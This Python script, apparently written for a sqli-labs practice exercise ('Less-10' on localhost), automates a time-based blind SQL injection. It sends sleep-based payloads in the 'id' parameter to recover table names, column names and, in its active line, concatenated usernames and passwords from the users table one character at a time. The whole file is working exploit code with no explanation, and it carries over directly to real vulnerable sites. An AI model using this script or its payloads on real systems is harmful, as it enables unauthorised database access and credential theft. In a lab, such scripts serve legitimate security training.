#coding:utf-8
import requests
import datetime,time

char = "abcdefghijklmnopqrstuvwxyz0123456789~*/\{}?!:@_-,"
namelen = 1024

name = ""
for i in range(1,namelen):
    flag = True
    for str in char:
	time1 = datetime.datetime.now()
	#表名id=1" and if(mid((select group_concat(table_name) from information_schema.tables where table_schema = database()) ,j,1)='str',sleep(5),0) --+
	#res = requests.get("http://localhost/sqli/Less-10/?id=1%%22%%20and%%20if(mid((select%%20group_concat(table_name)%%20from%%20information_schema.tables%%20where%%20table_schema%%20=%%20database()),%s,1)=%%27%s%%27,sleep(5),0)--+"%(i,str))
	#字段名id=1" and if(mid((select group_concat(column_name) from information_schema.columns where table_name = 'users'),j,1)='str',sleep(5),0) --+
	#res = requests.get("http://localhost/sqli/Less-10/?id=1%%22%%20and%%20if(mid((select%%20group_concat(column_name)%%20from%%20information_schema.columns%%20where%%20table_name%%20=%%27users%%27),%s,1)=%%27%s%%27,sleep(5),0)--+"%(i,str))
	#字段值id=1" and if(mid((select group_concat(username,0x3a,password) from users),i,1)='str',sleep(5),0)--+
	res = requests.get("http://localhost/sqli/Less-10/?id=1%%22%%20and%%20if(mid((select%%20group_concat(username,0x3a,password)%%20from%%20users),%s,1)=%%27%s%%27,sleep(5),0)--+"%(i,str))	
	time2 = datetime.datetime.now()
	sec = (time2 - time1).seconds
	if(sec > 2):
	     print(str)
	     name += str
	     flag = False
	     break
    if(flag):break
print(name)
